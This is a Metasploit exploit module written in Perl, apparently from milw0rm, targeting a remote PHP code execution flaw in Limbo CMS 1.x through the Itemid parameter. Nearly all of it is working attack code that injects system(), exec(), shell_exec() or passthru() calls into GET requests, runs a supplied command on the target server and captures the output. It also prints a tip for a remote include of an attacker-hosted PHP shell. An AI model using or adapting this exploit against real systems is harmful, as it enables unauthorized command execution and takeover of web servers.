Limbo CMS <= 1.0.4.2 (ItemID) Remote Code Execution Exploit (meta)
==================================================================





##
#      Title: Limbo CMS version 1.x suffers from a remote code execution vulnerability. 
#    Name: limbo_cms_1_x.pm
# License: Artistic/BSD/GPL
#         Info: Trying to get the command execution exploits out of the way on milw0rm.com. M&#039;s are always good.
#
#
#  - This is an exploit module for the Metasploit Framework, please see
#     http://metasploit.com/projects/Framework for more information.
##

package Msf::Exploit::limbo_cms_1_x;
use base "Msf::Exploit";
use strict;
use Pex::Text;
use bytes;

my $advanced = { };

my $info = {
	&#039;Name&#039;     => &#039;Limbo CMS version 1.x Code Execution&#039;,
	&#039;Version&#039;  => &#039;$Revision: 1.1 $&#039;,
	&#039;Authors&#039;  => [ &#039;sirh0t < sirh0t [at] hotmail.com >&#039; ],
	&#039;Arch&#039;     => [ ],
	&#039;OS&#039;       => [ ],
	&#039;Priv&#039;     => 0,
	&#039;UserOpts&#039; =>
	  {
		&#039;RHOST&#039; => [1, &#039;ADDR&#039;, &#039;The target address&#039;],
		&#039;VHOST&#039; => [0, &#039;DATA&#039;, &#039;The virtual host name of the server&#039;],
		&#039;RPORT&#039; => [1, &#039;PORT&#039;, &#039;The target port&#039;, 80],
		&#039;RPATH&#039; => [1, &#039;DATA&#039;, &#039;Path to the index.php script&#039;, &#039; /limbo/index.php&#039;],
		&#039;SSL&#039;   => [0, &#039;BOOL&#039;, &#039;Use SSL&#039;],
	  },

	&#039;Description&#039; => Pex::Text::Freeform(qq{
			This module exploits an arbitrary PHP code execution flaw in the Limbo version 1.*. All versions UNPATCHED Limbo 1.x are affected. Bug found by Aleksander Hristov
}),
#milw0rm this is your part ;p
	&#039;Refs&#039; =>
	  [
		[&#039;OSVDB&#039;, &#039;-----&#039;],
		[&#039;CVE&#039;,   &#039;---------&#039;],
		[&#039;MIL&#039;,   &#039;125&#039;],
	  ],

	&#039;Payload&#039; =>
	  {
		&#039;Space&#039; => 512,
		&#039;Keys&#039;     => [&#039;cmd&#039;, &#039;cmd_bash&#039;],
	  },

	&#039;DefaultTarget&#039; => 1,
	&#039;Targets&#039; =>
	  [
		[&#039;Vulnerably test&#039;,0],
		[&#039;use system()&#039;, 1],
		[&#039;use exec()&#039;, 2],
		[&#039;use shell_exec()&#039;,3],
		[&#039;use passthru()&#039;,4],
	  ],


	&#039;Keys&#039; => [&#039;limbo&#039;],

	&#039;DisclosureDate&#039; => &#039;Mar 03 2006&#039;,
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({&#039;Info&#039; => $info, &#039;Advanced&#039; => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host    = $self->GetVar(&#039;RHOST&#039;);
	my $vhost          = $self->GetVar(&#039;VHOST&#039;) || $target_host;
	my $target_port = $self->GetVar(&#039;RPORT&#039;);
	my $target_idx  = $self->GetVar(&#039;TARGET&#039;);
	my $target      = $self->Targets->[$target_idx];
	my $path           = $self->GetVar(&#039;RPATH&#039;);
	my $cmd            = $self->GetVar(&#039;EncodedPayload&#039;)->RawPayload;
	my ($data);

	# Add an echo on each end for easy output capturing
	$cmd = "echo _cmd_beg_;".$cmd.";echo _cmd_end_";

	# Replacing all spaces with %20
	$cmd =~ s/ /%20/g;

	# Create the get request data
	if ($target_idx == 0) {
		$data = "?option=frontpage&Itemid=phpinfo()";
	} elsif($target_idx == 1) {
		$data = "?option=frontpage&Itemid=system(\$_GET[m])&m=$cmd";
	} elsif($target_idx == 2) {
		$data = "?option=frontpage&Itemid=exec(\$_GET[m])&m=$cmd";
	} elsif($target_idx == 3) {
		$data = "?option=frontpage&Itemid=shell_exec(\$_GET[m])&m=$cmd";
	} elsif($target_idx == 4) {
		$data = "?option=frontpage&Itemid=passthru(\$_GET[m])&m=$cmd";
	}

	my $req =
	  "GET $path$data HTTP/1.1\r\n".
	  "Accept: */*\r\n".
	  "User-Agent: Mozilla/4.0 (MetaSploit)\r\n".
	  "Host: $vhost\r\n".
	  "Connection: Close\r\n".
	  "\r\n";

	my $s = Msf::Socket::Tcp->new(
		&#039;PeerAddr&#039;  => $target_host,
		&#039;PeerPort&#039;  => $target_port,
		&#039;SSL&#039;       => $self->GetVar(&#039;SSL&#039;),
	  );

	if ($s->IsError){
		$self->PrintLine(&#039;[*] Error creating socket: &#039; . $s->GetError);
		return;
	}

	$self->PrintLine("[*] Sending the malicious Limbo request...");

	$s->Send($req);
	my $results = $s->Recv(-1, 20);
	$s->Close();

	if ($target_idx == 0) {
	if ($results =~ /disable_functions/) {
		$self->PrintLine("[*] Server is vuln!");
		if ($results =~ /system()/) {
			$self->PrintLine("[?] system() is disabled");
		}
		if ($results =~ /shell_exec()/) {
			$self->PrintLine("[?] shell_exec() is disabled");
		}
		if ($results =~ /passthru()/) {
			$self->PrintLine("[?] shell_exec() is disabled");
		}
		if ($results =~ /exec()/) {
			$self->PrintLine("[?] exec() is disabled");
		}
			$self->PrintLine("[*] If safe_mode=on try $vhost$path?option=frontpage&Itemid=include(\$_GET[m])&m=http://PHPSHELL?&");

	} else {
	 	$self->PrintLine("[-] Server NOT vuln!");
	} 
	} elsif ($results =~ m/_cmd_beg_(.*)_cmd_end_/ms) {
		my $out = $1;
		$out =~ s/^\s+|\s+$//gs;
		if ($out) {
			$self->PrintLine(&#039;----------------------------------------&#039;);
			$self->PrintLine(&#039;&#039;);
			$self->PrintLine($out);
			$self->PrintLine(&#039;&#039;);
			$self->PrintLine(&#039;----------------------------------------&#039;);
		}
	} else {
		$self->PrintLine(&#039;[-] exploit failed&#039;);
	}

	return;
}

1;


